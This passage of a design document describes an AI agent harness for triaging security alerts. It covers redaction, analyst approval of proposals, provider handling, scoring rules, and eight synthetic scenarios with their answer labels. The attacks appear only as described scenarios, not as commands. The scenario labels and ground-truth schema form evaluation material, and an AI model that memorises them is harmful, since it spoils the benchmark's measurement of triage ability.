`evidence[]` discriminated by `@odata.type` and `mitreTechniques` as `T####.###`
strings, which is the natural join to ATT&CK.

## Access control, sensitive data, traceability

- Every tool declares a required scope. The agent runs under an analyst role. A call
  outside scope returns a structured denial the agent must handle, not an exception.
- Redaction runs before the model sees anything, in two layers whose guarantees differ,
  stated the way the grounding report states its own:

  **Guaranteed by structure.** A view is a closed schema: every field the model sees was
  declared by name. Record views (identity, asset, IOC reading, ATT&CK, related alerts,
  process lineage) name each field they carry. Tabular views (hunting, SIEM) keep only
  the columns on the tool's allowlist, plus aggregates over allowlisted columns, and
  report how many columns were dropped as a count, never by name, so the model knows the
  row is a projection and cannot ask for a dropped column. `AdditionalFields` and `_raw`
  are on no allowlist; that is where nested JSON with service account passwords and NTLM
  hashes lives. Display names, given and family names, phone numbers and coordinates are
  on no view: `Latitude` and `Longitude` are not on the hunting allowlist, so the
  structural claim holds without the backstop; `City` and `Country` are, because a
  sign-in's location is the substance of a travel alert. The user principal name and email are: they are the join keys of the
  investigation, and an investigation that cannot name the account cannot triage it.

  **Best effort by pattern.** A generic pass over every string of every view is the
  backstop for what an allowlisted column carries in free text, a command line above
  all: secrets by pattern (tokens, keys, private key blocks, password assignments and
  flags), secret-bearing and personal fields by name at any depth, and the same inside
  any string that is itself a JSON object or array. A secret that matches no pattern in a
  command line reaches the model. That is the residual risk, and it is stated rather
  than hidden.

  **The raw holds everything else**, out of context, by ref and hash. Redaction is a
  projection, not a destruction: an analyst with access to the artifact store sees what
  the model did not.
- Every tool call is journalled with id, timestamp, caller, arguments and a hash of the
  response. The audit trail reconstructs the investigation without replaying it.

## Human in the loop

`HumanInTheLoopMiddleware` with `interrupt_on` over `propose_alert_disposition`. The
nine read-only tools are auto-approved. The proposal pauses the graph with the proposed
verdict, action, escalation and summary in front of the analyst, and resumes with
`Command(resume=...)` on a checkpointer.

A proposal that breaks the ordering rules of the write action never reaches the
analyst: the turn jumps past the interrupt to the tool node, and the runner's denial is
what the model reads. The analyst decides on proposals, not on the model's mistakes.

Two decisions are offered, accept and reject with an optional reason. Not edit: an
edited proposal would be the analyst's verdict in the model's mouth, and the harness
would then measure the analyst. On accept the tool runs and the proposal is journalled.
On reject the tool does not run, the model is told so with the reason, and it may
propose again or answer. Every decision is recorded on the run artifact with the
proposal it answered, so the artifact shows what was proposed and what the human did.

The agent never closes an alert. It prepares the investigation and proposes.

## Model independence

`init_chat_model("{provider}:{model}")` throughout, so Anthropic, OpenAI, Google, a
local model through Ollama, or any OpenAI-compatible server are interchangeable.
Capability detection goes through `model.profile` rather than trial and error, which
also decides `ProviderStrategy` versus `ToolStrategy` for structured output.

- The decision is made once per model from `profile["structured_output"]`: true means
  `ProviderStrategy`, anything else means `ToolStrategy`. LangChain's own automatic
  choice falls back to matching model names when a profile is missing; that fallback is
  not used here, because a strategy chosen from a name is a guess and a guess is what
  the profile exists to replace. A model with no profile gets `ToolStrategy`, which every
  tool-calling model supports. The resolution is recorded on the artifact as
  `output_binding`, so a reader sees the strategy and the values that chose it.
- **The provider strategy asks the provider to enforce the schema, and the artifact
  records that it asked.** A profile declaring `structured_output` says the provider
  can enforce a schema. It does not say the harness asked it to, and until 2026-09-15
  the harness did not. `langchain` 1.4.0's `ProviderStrategy` carries
  `strict: bool | None = None` and puts `"strict": true` on the wire only when asked;
  the strategy here passed nothing, so `langchain-openai` 1.6.2 sent `TriageResult` to
  the Chat Completions API with `strict: false`. The first OpenAI gate run showed what
  that binds: `gpt-5-nano` on scenario 1 at 17:05 UTC, kept as
  `runs/atypical_travel/probe-gpt-5-nano/`, made seven tool calls, six `ok`, and on its
  second model turn returned a result with a `summary` key the schema forbids. The
  parse failed, the run is `failed_error` of kind `StructuredOutputValidationError`,
  and no pass was left. The same client had already sent every tool schema as strict,
  since that API requires it whenever a `response_format` is present; only the output
  schema was not. The provider was never asked for the guarantee the profile
  advertised, so the failure is the harness's, by the rule that makes a refusal the
  quota's number and the retry count the harness's: a run that fails on a knob the
  harness left unset measures the harness. Whether strict was available for this
  schema was not known, since that API's strict mode accepts a subset of JSON Schema
  and the schema carries `minLength` eight times, `minItems` on the evidence list,
  `pattern` on the technique ids and `minimum` and `maximum` on the confidence. One
  probe, one run, the same model and scenario with `ProviderStrategy(schema,
  strict=True)`, 17:18 UTC, kept as `runs/atypical_travel/probe-gpt-5-nano-strict/`,
  made by a script that replaced the strategy for that run and nothing else, so its
  artifact predates the field and records no flag; that it was bound strict is the
  script's word and this paragraph's, not the artifact's. The API accepted the schema with every keyword in place, the first pass parsed, the
  correction pass parsed under the same binding for `CitationRepairs`, and the run
  completed, `inconclusive` at 0.58 against `false_positive`, six calls all `ok`, four
  model turns, 122 seconds. No keyword was refused. Decided: the provider strategy is
  constructed with `strict=True`, always, and the tool strategy is unchanged, since it
  has no such flag. What the flag does per client, read in the installed packages and
  built offline for all three with no socket: `langchain-openai` 1.6.2 reads it, sets
  `"strict": true` on the response format and rewrites the schema the way strict mode
  requires, every property `required` at every level, so the four list fields with
  defaults must be emitted; `langchain-anthropic` 1.7.2 drops it and sends the schema
  under `output_config.format`, which that API enforces without a flag;
  `langchain-google-genai` consumes it and sends `response_json_schema`, dropping
  `minLength` and the flag alike. So the flag changes what one provider is asked and
  nothing about the other two, and it is asked of every provider-bound run rather than
  of one named provider, because a strategy that varied by name would be the name
  fallback again. What is guaranteed and what is not: that the flag is asked for is
  held by the strategy and recorded on the artifact as `output_binding.strict`; that
  the provider honours it is the provider's, and the validator downstream is unchanged,
  so a schema violation that still reaches it is `failed_error` as before. A test holds
  the strategy to the flag and the binding to the record.
- Provider packages are optional extras, not dependencies: `alert-forensics[anthropic]`,
  `[openai]`, `[google]`, `[ollama]`. A missing provider fails at start-up with the
  package to install named, before any tool runs.

- **Every model call is bounded.** `timeout` and `max_retries` are passed through
  `init_chat_model` to the provider client, from `--timeout` (default 60 seconds) and
  `--max-retries` (default 1). Without them the Google client retries a 429 or a 503
  six times with exponential backoff and says nothing, and the first real run of this
  project sat silent for minutes before failing: a rate limit, a slow call and a freeze
  were indistinguishable. The two values are passed verbatim and recorded verbatim on
  the artifact. Providers do not agree on what `max_retries` counts: Anthropic and
  OpenAI count retries after the first attempt, Google counts attempts including the
  first, so `1` there means no retry at all, and Ollama accepts neither knob and runs
  unbounded. The harness does not translate between them; a translation table would
  be a guess per provider, and the artifact would then record a number the client
  never saw.
- **A provider refusal is named as such.** When the client raises after its retries
  are spent because the provider would not serve the call, a rate limit or quota
  (HTTP 429, `ModelRateLimitError`) or an overloaded model (HTTP 503 or 529), the
  run is `failed_error` with the error kind `rate_limit` or `overloaded`, not the
  exception's class name. The classification reads the LangChain error class first,
  then the status code the exception carries, then the message, in that order, so a
  provider whose client does not yet map onto LangChain's error classes is still
  named. Any other exception keeps its class name as the kind, as before.

The harness is not tied to a vendor.

## The agent graph

A LangGraph `StateGraph` with four nodes, built once per investigation around one
`ToolRunner`, so every tool the model calls is journalled by the slice 2 pipeline by
construction. The graph is compiled on a checkpointer so the interrupt can resume.

```
investigate  the create_agent subgraph: tools from the runner, the human-in-the-loop
             middleware, TriageResult as the response format
ground       validate_grounding(result, trace); route on the report
repair       the correction pass: fresh model call, repair instruction in, repairs out,
             applied to the result; back to ground
finish       set the outcome: completed, failed_ungrounded, or failed_error when the
             model produced no result
```

- The model sees the alert once, as the first user message, in its wire form after the
  generic redaction pass. Display names in the alert's evidence are erased there.
- Tools are exposed to the model with the request model's JSON schema and validated by
  the runner, not by LangChain. A call with wrong arguments must reach the journal as
  `invalid_arguments`; a validation error thrown before the runner would leave the call
  unjournalled.
- A `ToolCallRecord.step` is the index of the model turn that emitted the call, read
  from the messages the tool node sees. The tool's `ToolMessage` content is the
  record's `redacted_response`, verbatim, and its artifact is the record.
- One turn's tool calls run one at a time, in the order the model emitted them. LangGraph
  would run them on a thread pool, and then the journal order, the trace, and the raw
  store's file order would vary from run to run for the same script. A run is
  deterministic up to model sampling only if the harness adds no randomness of its own.
  Parallel calls still share a `step`; the trace says so.
- The checkpointer deserialises the project's own contract types and LangGraph's
  built-ins, listed by class, and refuses anything else. A checkpoint is data, and data
  does not get to name a class.
- The graph runs under a recursion limit. Exceeding it is `failed_error` of kind
  `budget`. Any exception out of the graph, a provider error, unparseable structured
  output, an exhausted script, is `failed_error` with the exception's kind and message,
  and the artifact is still written with the trace as it stood. A provider refusal is
  the one exception whose kind is not its class name: `rate_limit` or `overloaded`,
  see model independence.
- The runner accepts a callback that receives every `ToolCallRecord` as it is
  journalled. That is how the console script shows progress: the runner already holds
  every record, so progress is a view over the journal, not a second source of truth.

## The scripted client

The whole cost discipline rests on running without a model, and the graph is untestable
without a stand-in, so the scripted client is part of the graph slice, not the
evaluation slice.

- It is a `BaseChatModel`. It replays a script of turns, each either a set of tool
  calls with their ids, or a structured output payload. It implements `bind_tools` so
  `create_agent` binds it like any provider model, and it renders a structured turn the
  way the bound strategy expects: JSON content under `ProviderStrategy`, a call to the
  structured-output tool under `ToolStrategy`. Both strategies are therefore exercised
  by the same script.
- It declares a `profile`, so the strategy decision above is exercised on it rather
  than bypassed for it.
- It emits deterministic `usage_metadata` on every turn, so the usage path of the trace
  is exercised without a provider.
- A turn may be a callable that receives the messages so far and returns the turn. That
  is how the demo script cites the calls that succeeded rather than the calls it hoped
  would.
- A script that runs out is an error, and the run is `failed_error`. A script that
  cites an id it never emitted is how the correction loop is tested on both outcomes.
- No key, no network, nothing to configure.

## Scenarios

Eight, realistic, entirely synthetic. Context: investment bank, around 45 000
endpoints, Entra ID with hybrid AD, Defender for Endpoint, Splunk ES with risk-based
alerting.

1. Atypical travel, Paris to Amsterdam. It is the group SASE gateway. **False positive.**
2. Password spray on the tenant, one success, then a new MFA method and a mailbox rule.
   **True positive** with follow-on activity.
3. Mailbox forwarding rule to an external address, filtering on invoice, IBAN, swift,
   payment. Three users, same destination. **True positive**, payment fraud.
4. Encoded PowerShell on a production server. Configuration management agent, declared
   maintenance window. **Benign true positive**: document an exception on the triplet,
   do not disable the rule.
5. LSASS access blocked. Internal red team exercise, account on the exercise list.
   **Benign true positive**, and confirm the prevention worked.
6. Apparent Kerberoasting, 180 SPNs in 90 seconds. It is the credentialed vulnerability
   scanner. **Structural false positive**: requalify as tuning rather than close it for
   the fifty-second time this year.
7. **The trap.** An RMM tool blocked by the EDR, signed binary, VirusTotal 0 of 72. The
   tier-one reflex is to close it in ninety seconds. It is initial access: the relay is
   not the IT provider's, an `mshta.exe` from a mail client preceded it by six minutes,
   and the block only caught the second attempt. Red Canary documented sixteen abused
   RMM tools in 2025. **True positive.**
8. The reverse trap. 6.2 GB to personal cloud storage by an employee who has resigned.
   It is a personal photo folder, 94 percent image content type, no abnormal access to
   sensitive shares. **False positive**: the upload is real, and no organisational data
   left, so exfiltration is not supported. The rule is not at fault and is not tuned;
   the finding is routed to HR as personal use of a corporate device. See the table
   below for why this is not benign.

Seven and eight are the point of the exercise: the obvious signal points the wrong way
in both directions.

Every label, checked against the discriminator under "The four verdicts". The signal
is what the rule's logic measured; the assertion is what it claims about the world, at
the granularity of the technique it detects, with intent left out. The signal is true in
every row. The verdict turns on the assertion, then on intent.

| # | Signal measured | Assertion made | Assertion true? | Intent | Label |
|---|---|---|---|---|---|
| 1 | Two sign-ins by one user whose source IPs geo-locate to Paris and Amsterdam, 40 minutes apart | The person, or their credentials, was used from two places they could not both have been | No: one egress, the SASE gateway; the geo-IP of a gateway is not where the person is | n/a | false_positive |
| 2 | Many failed sign-ins across many accounts from few sources, then one success | Credentials were guessed at scale and an account was taken over | Yes: the success is followed by a new MFA method and a mailbox rule | Unauthorised | true_positive |
| 3 | Inbox rules created that forward to one external address, filtering on payment terms | Mail is being diverted outside the organisation | Yes: three users, one destination, invoice and IBAN filters | Unauthorised, payment fraud | true_positive |
| 4 | `powershell.exe` launched with an encoded command on a production server | An obfuscated command was executed on the server | Yes: the command was encoded, whoever ran it | Authorised: configuration management agent, declared window | benign_true_positive |
| 5 | A process opened LSASS with read access and was blocked | A process attempted to read credentials from LSASS memory | Yes: the attempt was made, and prevented | Authorised: red team, account on the exercise list | benign_true_positive |
| 6 | One account requested service tickets for 180 SPNs in 90 seconds | Service tickets were harvested to crack service-account passwords offline | No: the credentialed scanner obtained tickets to authenticate to the services it scans; nothing was harvested for cracking | n/a | false_positive |
| 7 | The EDR blocked a signed remote-management binary with a clean reputation | A remote-management tool was executed on the endpoint | Yes: the block caught the second attempt; the first ran, to a relay that is not the IT provider's, six minutes after `mshta.exe` from the mail client | Unauthorised, initial access | true_positive |
| 8 | 6.2 GB uploaded to a personal cloud storage domain by a user on the leaver list | Organisational data was moved out to personal storage by a departing employee | No: the folder is personal photographs, 94 percent image content type, and no sensitive share was touched. The rule is not at fault and is not tuned; the finding goes to HR | n/a | false_positive |

**One label moves: scenario 8, from benign true positive to false positive.** Read at
the level of the signal, a departing employee did upload to personal storage, and that
is the sentence under which the label was benign. Read at the level of the assertion,
the rule is named for exfiltration, and exfiltration is organisational data leaving;
none did. The operational test is whether the technique the rule names actually
occurred: encoded PowerShell did, an LSASS read did, Kerberoasting did not,
exfiltration did not, travel did not. All eight fall out of that without depending on
phrasing. Six is the same shape as eight: a sanctioned actor produced the exact volume
the rule measures without performing the technique the rule is named for, and if eight
were benign because the upload really happened, six would be benign because the tickets
really were requested. The two part on the action axis, not the truth axis. Six tunes
permanently by excluding the scanner's account. Eight tunes nothing: the rule did its
job, the human looked, and the finding is routed to HR. Eight stays the reverse trap:
the obvious signal still points at an incident, and it is not a security incident.

Seven is the mirror of one: a signed binary and a clean reputation make the assertion
no less true, as a gateway's geo-IP makes the travel no more real. Four holds because
encoding is a property of the command, not of who ran it: the assertion is true and
the intent decides. Five holds the same way.

## Using it

This is a tool, not only a demonstration. It installs as a console script and is usable
by someone who is not the author.

```
alert-forensics triage ALERT.json --model anthropic:claude-sonnet-5 --role analyst -o run.json
alert-forensics triage ALERT.json --scripted -o run.json
alert-forensics show run.json
alert-forensics replay run.json
alert-forensics eval --scripted
alert-forensics eval --model anthropic:claude-sonnet-5 --runs 3
alert-forensics eval-report results/
```

- `triage` reads a real Microsoft Graph `security.alert` v2 export, runs the
  investigation, and writes the run artifact: outcome, trace, grounding report, and the
  raw store directory beside it, named after the artifact. `--role` is `analyst` or
  `tier1`. `--max-corrections` overrides the default of one.
- `--scripted` runs the same graph on the scripted client with a built-in script
  derived from the alert's evidence. No key. The verdict of a scripted run is
  `inconclusive` by construction and its missing context says why: the script replays
  calls, it reasons about nothing. What it demonstrates is the mechanism: the journal,
  the grounding, the interrupt, the artifact. It is a plumbing check, not the front
  door; the front door for someone without a key is `replay`.
- The proposal interrupt is answered on the terminal, or ahead of time with `--accept`
  or `--reject REASON` when there is no terminal. A run with neither and no terminal
  stops with that message rather than deciding for the analyst.
- The nine fixtures ship inside the package, so an installed tool runs without the
  repository. `--fixtures DIR` points at another set, which carries its own
  `scenarios.json` manifest, see the tool layer; without one, only `shared` and `test`
  stubs load, and a run of an alert the manifest does not name is offered `shared`
  stubs alone and told so on stderr.
- `get_attack_technique` is live against the public bundle in every mode, `--scripted`
  included: it is live-capable and needs no key, so a fixture there is a gap the
  example would fall into. When the bundle cannot be fetched the adapter falls back to
  the recorded excerpt that ships in the package, cut from the real bundle and holding
  every technique the eight scenarios declare, and every follow-on technique a scenario's
  investigation is expected to resolve, which scenario 2 names under "Evaluation"; the
  artifact's `adapters` field says `recorded` instead of `live`. A cached bundle counts as live: it is the real bundle.
  `lookup_ioc` is live when `VIRUSTOTAL_API_KEY` is set and fixture-backed otherwise.
- No example alert declares a technique the default adapter set cannot resolve
  offline. A test enforces it, so a scenario that lands with a technique missing from
  the excerpt fails the suite rather than the newcomer's first command.
- `show` prints an artifact readably: outcome, verdict and confidence, each grounded
  fact with its citations and the systems they resolved to, assumptions, missing
  context, the recommended action, the human decisions, and the ungrounded facts when
  the run failed.
- `replay RUN.json` reads a recorded artifact, verifies the raw store beside it against
  the recorded hashes, states the model and the date of the run, and prints it through
  `show`. Recorded runs live under `runs/<scenario>/<recording>/`, one directory per
  recording holding `run.json` and `run.raw/`, and each is a recording of a real model
  run, never of the scripted client: a recording of the scripted client would be a
  fake demo, which is worse than none. A test refuses a committed recording whose model
  is the scripted client, and one the provider served no model turn of.
- **A recording is a served run, and a served run may hold no tool call.** The test
  used to refuse a recording that held no tool call, as a proxy for a run the provider
  refused before any turn, which holds nothing to replay. Scenario 7's real run showed
  the proxy wrong: the provider served it two model turns, and the model chose to call
  nothing and answer from the alert. That decision is the run, and for scenario 7 it is
  the trap closing, so a contract that could not hold it would refuse the one recording
  the scenario exists to show. Decided: a recording is a served run, and served is the
  one definition under "A provider refusal is the quota's number": a run whose error
  kind is not `rate_limit` or `overloaded`, whatever its outcome and however many
  turns it made, and one that holds at least one model turn, since a run that failed
  at its first call on its own account holds nothing to show. What the model did with
  its turns is what the recording shows, whether that is nine calls or none. The first
  version of this sentence said the model turn separated a recording from a refusal,
  and it did not: a run refused after work holds every turn it made before the
  provider said no. The test written on that sentence read `trace.usage`, and run 2 of
  scenario 1's cell in the results directory, `failed_error` of kind `rate_limit`
  after two turns and two tool calls, passed it when copied under `runs/`. What is
  structural and what is not, stated: the predicate is on the artifact type,
  `RunArtifact.refused`, derived from the error kind by the one rule the scorer, the
  summary and `triage`'s exit code already read, so no two places can disagree on what
  a refusal is and the test asserts the property rather than restating the rule. That
  no refused run and no scripted run sits under `runs/` is held by the test over the
  directory and cannot be structural: a directory is not a type, an artifact cannot
  know where it was copied to, and nothing the code runs sees a copy before it is
  committed. Said so, beside the part that is. Such a recording has no raw store: the
  trace refers to nothing, the harness wrote no file, and git keeps no empty directory,
  so `run.raw/` is absent beside it. `replay` verifies every raw response the trace
  refers to, which for such a run is none, and requires the store directory only when
  there is a reference to resolve; a recording with references and no directory is
  still refused, as before. It says on its first lines that the model made no tool
  call, so the absence reads as the run's and not as a missing file. The recording
  probe reads it and finds no request, which is the truth of it. The first such
  recording is `runs/rmm_block/campaign-0/`, and scenario 7's section cites it.
- **Which runs are committed is a rule, not a choice.** A recording belongs under
  `runs/` when a decision in this document cites it, or when it is the scenario's
  demonstration run: the first completed real run on the scenario in the order the
  runs were made, the gate run of "One real run before a cell is paid for" included,
  whatever it scored. The results directory is not committed, so a run this document
  cites must be under `runs/` to be replayable by a reader, and the demonstration run
  is chosen by rule so that it is not the best one. A run the provider refused is not
  a recording, before any turn or after work; a served run that made no tool call is
  one, see above. The first recording, made before the
  `no_fixture` rule, the whole-word tokens and the label binding, stays as
  `runs/atypical_travel/defaults-2026-09-14/`: it is the run that found the default
  defect, and scenario 1's section cites it. Fifteen recordings across eight scenarios
  are committed as of 2026-09-15, each listed in `runs/README.md` with its model, its
  date, the run index it was copied from and what it shows; the ones with `campaign-`
  in the name are copies of run directories of the results directory of 2026-09-15,
  artifact and raw store unchanged, and for scenarios 7 and 8 that run directory is
  the gate run, the only real run each has had. The ones with `probe-` in the name are
  run directory 0 of the gate directory of the same name under `gates/`, the gate runs
  of the priced tiers on scenario 1 of 2026-09-15, copied the same way; each is cited,
  by scenario 1's section for the asset question and by "Model independence" for the
  strict binding. `eval` and `eval-report` are described
  under "Evaluation"; the viewer over the same artifacts is the next slice.
- The model is chosen with `--model provider:name` through `init_chat_model`, so any
  provider works, and so does a local model through Ollama.
- `--timeout SECONDS` (default 60) and `--max-retries N` (default 1) bound every model
  call, passed through to the provider client and recorded on the artifact as
  `model_limits`. They exist because the alternative was verified: a client left on its
  defaults retries a rate limit in silence for minutes.
- While the investigation runs, one line per journalled tool call goes to stderr: the
  step, the tool name, the outcome and the duration. stdout carries the result line
  alone, so `triage ... | jq` and redirection keep working. `--quiet` suppresses the
  progress. Nothing is printed between launch and the first tool call, and nothing
  between the last and the result line; that is why the model call itself is bounded.
- The Google client logs notes to itself, and a tool that opens with library noise reads
  as broken. Three messages are filtered at startup, each by the substring that
  identifies it, on the logger that emits it, since a parent's filters do not see a
  child's records. From `langchain_google_genai`: the JSON schema key it does not
  support and ignores, one warning per tool, twice, twenty-two lines on a run. From
  the `google_genai` SDK, found printed above every run of the first campaign: the
  warning that there are non-text parts in the response, which fires once per process
  when a response holds function calls and the SDK's text accessor is read, and the
  advice against direct use of automatic function calling, which the LangChain
  integration does not use and cannot act on. None is a fault in the run. Nothing else
  is filtered: a warning that is not one of the three is printed, because the next one
  may be real.
- A run the provider refused to serve, a rate limit, a quota, or an overloaded model,
  after the retries were spent, ends with a message on stderr naming the provider, the
  model, and the fact that it is the provider's capacity and not a bug in the run, and
  the exit code is 3. The artifact is still written, with `error.kind` `rate_limit` or
  `overloaded`. Exit codes: 0 completed, 1 the run failed on its own account
  (`failed_ungrounded`, or `failed_error` of any other kind), 2 usage or configuration,
  3 the provider refused. A silent wait is the one behaviour a CLI must never have.

Every tool sits behind a `ToolAdapter` interface that declares its required scope and
its response shape. Two adapters are genuinely live and need no SOC: `lookup_ioc`
against the VirusTotal v3 API with a free key, and `get_attack_technique` against the
public ATT&CK STIX bundle with no key at all. The other seven are fixture-backed and
their live contract is documented, so someone with a Defender or Splunk tenant ports
them rather than rewrites them.

The README states, per tool, which is live-capable and which is fixture-backed.
Claiming more than that is how this gets caught in an interview, and the honesty is
worth more than the claim.

## Demonstration

The harness produces numbers. The demonstration makes the mechanism visible.

A static replay viewer, served from committed run artifacts, with no backend and no API
key at runtime:

- Pick a scenario and watch the investigation step through: each tool call, its
  arguments, and the redacted response the model actually saw.
- The structured output rendered as three distinct blocks. Every observed fact carries
  its citation, and clicking it expands the exact tool response it rests on. The
  grounding is not claimed, it is inspectable.
- Missing context shown as a first-class block rather than as an absence.
- For scenario 7, a side-by-side view: the same alert, the same evidence, two model
  tiers, opposite verdicts.

That last view is the argument in one screen. The matrix page carries the rest.

## Evaluation

The harness produces the numbers the project exists for. Every decision below was taken
before the seven remaining scenarios were written, because the scorers decide what a
scenario file must contain: seven ground truths written against a schema nobody had
exercised would all be rewritten once the first score came out.

### Ground truth as a contract

One `GroundTruth` file per scenario, beside its alert: `examples/<scenario>.alert.json`
and `examples/<scenario>.truth.json` share the stem, and the stem is the scenario's name
everywhere else, under `runs/` and under the results directory.

```
GroundTruth
  scenario           the file stem; the loader refuses a file whose stem disagrees
  alert_id           the alert's id; the loader refuses a pair whose ids disagree
  verdict            Verdict, the label from the table under "Scenarios"
  escalate           whether the investigation is expected to escalate
  required_findings  [{name, tools: [tool_name], tokens}]
  missing_context    [{name, tokens}]

tokens               [token], each token a string or a list of alternative strings
```

- `alert_id` is on the truth so that the pairing is checked, not assumed: a truth file
  copied beside the wrong alert fails to load rather than scoring the wrong scenario.
- `tools` names tools from the tool surface, validated against the registry; the write
  action is refused there, since its record is never evidence and a finding resting on
  it could never be carried by a grounded fact. One entry is the common case. Several
  entries mean the same fact can be established from more than one system, as a
  sign-in can be read from the hunting API or from the SIEM; the finding is reached
  through any of them. Several entries are not a hedge: a tool is listed only when its
  reading carries the finding's words. Scenario 1's gateway finding was the first
  example here and is no longer one, because VirusTotal's reading of the egress
  address carries an owner name and a network range, and not, in any word of it, what
  the address is; see the scenario for the check against the fixture.
- Names are unique within a file and appear in the score, so a miss is reported by name.

**A required finding is matched against an emitted fact by tool and by tokens, never by
a model.** A finding cannot reference a `tool_call_id`, which is generated per run, so
the match is defined on what a run does preserve: which tool a fact cites, and what its
statement says. A finding is reached when at least one observed fact satisfies both:

1. The fact is grounded, and among the calls it cites there is one whose `tool_name` is
   in the finding's `tools`. Grounding is required first: only a grounded fact carries a
   finding, so a fact that says the right thing on a citation that does not resolve is
   not credited. The tool is read from the trace record the citation resolves to, never
   from the statement.
2. The fact's statement contains every token, as whole words. Statement and token are
   both read as a sequence of words: split on whitespace, each word stripped of the
   punctuation at its ends, compared case-insensitively. A token is present when its
   words occur contiguously among the statement's words. A token that is a list of
   alternatives is satisfied by any one of them, so `["SASE", "VPN", "gateway"]` reads
   "one of these"; the list is small on purpose and is written out in the file where a
   reviewer sees it.

**A token never matches inside a larger word.** The first version of this rule was a
substring test, and it credited the committed scenario 1 recording with the gateway
finding on the token `SASE` found inside `EXAMPLE-SASE-NET`, the ASN owner name
VirusTotal returned. The model had copied a name; it never said gateway, and the finding
that carries the whole verdict was reached on letters the model did not choose. Under a
substring rule a token can be fitted to whatever the fixture happens to name, and a
truth file written after a recording exists, as scenario 1's was, will be. Whole words
make a token a claim the statement made. The cost is stated rather than hidden: a
plural, a possessive and a hyphenated compound are different words, so `log` does not
match `logs` and `SASE` does not match `EXAMPLE-SASE-NET`; where the truth author wants
them, they are listed as alternatives, in the file, where a reviewer sees them.
Punctuation at the ends of a word is stripped, so `Paris,` and `(EXAMPLE-SASE-NET)` are
the words they wrap; punctuation inside a word is part of it, so `203.0.113.7` is one
word that `203.0.113` does not match, and `T1078.004` is not `T1078`. A token that
normalises to no word at all could never match, and the loader refuses it.

The match is deterministic and a human can see why it passed or failed: the score names
the finding, the tokens it missed, and the facts it examined. A model judge would put a
model back inside the measurement, which is the thing this project exists to avoid, and
its misses would not be inspectable. The cost is that tokens are a literal floor: a fact
that establishes the finding in words the tokens did not anticipate is a recall miss.
That miss is visible by name, and widening the tokens is a decision a person reviews in
a diff. A judge's miss is neither.

An expected missing-context entry is matched the same way, on tokens alone: an entry is
named when at least one `missing_context` item contains every token across its `what`,
`why_it_matters` and `how_to_obtain` joined by a space. There is no tool to anchor to,
since missing context is by definition what no call established.

### Scorers

Each run is scored on its own into a `RunScore`, from its artifact and the scenario's
ground truth, and the cell numbers are built from the run scores. A `RunScore` is fully
derived: it can be recomputed from the artifact and the truth file at any time, which is
what `eval-report` does, so a ground truth corrected after a cell was run re-scores the
cell without running the model again.

- **Verdict accuracy.** Exact match of the four values, no partial credit. A run scores 1
  or 0, and the cell number is the proportion of runs scoring 1.
- **Evidence recall.** Required findings reached over required findings, counting only
  findings carried by a grounded fact. The cell number pools the pairs: reached
  findings summed over runs, over required findings times runs.
- **Missing-context recall.** Expected entries named over expected entries, pooled the
  same way.
- **Escalation precision and recall.** A run is a predicted escalation when it completed
  and its result escalates; it is an expected escalation when its ground truth says so.
  Recall is correct predictions over expected escalations; precision is correct
  predictions over predicted escalations. A failed run predicts nothing, so it never
  enters the precision denominator, and it is a missed escalation wherever one was
  expected. A cell with no expected escalation has no recall, and one with no predicted
  escalation has no precision; both are reported as absent, never as zero or one.
- **`ungrounded_claim_rate`.** Zero on a completed run by construction: the artifact
  refuses to validate otherwise. It is reported anyway, pooled over the facts of the
  completed runs, as the check that the loop did its job, and the summary carries a flag
  that says whether it held.

The pooled proportions treat every (finding, run) pair as one trial. Pairs from one run
are not independent, so the interval on a pooled recall is narrower than the truth; it is
reported as such, and the run count beside it says how much weight to give it.

### Failure is a first-class number

A run whose outcome is `failed_ungrounded` or `failed_error` scores zero on every
metric: verdict wrong, no finding reached, no missing context named, no escalation
predicted. It stays in every denominator. The failure rate is reported beside accuracy,
split by outcome and, for `failed_error`, by error kind, and it is never folded into
accuracy and never dropped. A model that fails a third of its runs cannot show a clean
accuracy on the rest: its accuracy denominator is all of its runs.

### A provider refusal is the quota's number, not the model's

The first real campaign settled this. Nineteen runs of `google_genai:gemini-3.5-flash-lite`
on the free tier: three completed, each with the right verdict, and sixteen were refused
with `rate_limit`, fourteen of them before any model turn, with no tool call and no usage
at all. Under the rule above those sixteen scored zero and stayed in every denominator,
so three cells read 0 of 3 on verdict accuracy with not one model call behind the
number, and since a cell accumulates, no rerun could ever lift them above 50 percent
failure. The rule for `max_corrections` decides it: a number that depends on how many
times the harness was willing to retry is a property of the harness, not of the model,
and a number that depends on how many calls the provider was willing to serve is a
property of the quota. A refused run measures the provider's capacity. The console
script already says so on its own account: exit code 3, and not 1.

Decided:

- **A run is refused when its error kind is `rate_limit` or `overloaded`, whatever its
  outcome.** That is the rule `triage` exits 3 on, applied unchanged. It covers a
  `failed_error` with no result, and a `failed_ungrounded` whose correction pass the
  provider refused: in the second case the first pass produced an ungrounded result and
  the loop exists to repair exactly that, so charging the model for a repair it was
  never allowed to make would measure the quota under the name of grounding. The score
  carries `refused`, and its validator holds the flag to the error kind in both
  directions, so a score cannot say one thing and its artifact another.
- **A refused run is out of every accuracy and failure denominator.** Every cell counts
  its `served` runs, the runs the provider let run to their end, and `completed`,
  `failed`, `failed_ungrounded`, `failed_error`, verdict accuracy, evidence recall,
  missing-context recall and escalation precision and recall are over the served runs.
  `refused` is its own proportion, over all runs, with its interval and its kinds by
  count, and the cell's `error_kinds` hold only the failures the run owns. The rule that
  a failed run scores zero and stays in every denominator is unchanged for those:
  `failed_ungrounded`, and `failed_error` of any other kind, are the run's own, and a
  model that fails a third of its served runs still cannot show a clean accuracy on the
  rest. A validator on the cell holds served plus refused to the run count and every
  accuracy denominator to served, so the two populations cannot drift apart in code.
- **Refused before any turn and refused after work are counted apart, and both
  leave.** The score carries `model_turns`, the usage records in its trace, and the cell
  reports how many refusals came before any model turn and how many after one. They
  are the same for the accuracy denominators, since neither produced a result the model
  can be measured on, and different for the spend: a run refused after two turns and
  four tool calls consumed tokens and wall clock that a run refused at its first call
  did not, and "Cost and latency" says where those go. Tool calls are the one pool a
  refused run stays in: a call the model made is the model's whatever the provider did
  next, and a fixture gap it hit is a gap, so the tool-calls block reads every trace and
  a refusal before any turn contributes nothing to it.
- **The report cannot be read as a capability cell.** Every cell prints a `served`
  line before any number: how many of its runs were served, how many refused, and that
  every proportion below is over the served runs. A cell with no served run says on
  that line, in words a skim cannot miss, that it measures the quota and not the model,
  and every proportion below it reads `0/0 n/a`, because an empty denominator has no
  estimate and no interval. Every artifact stays on disk whatever the kind, and
  `eval-report` re-scores the campaign above from its run directories without running
  anything: its three completed runs are their cells' whole served population, and the
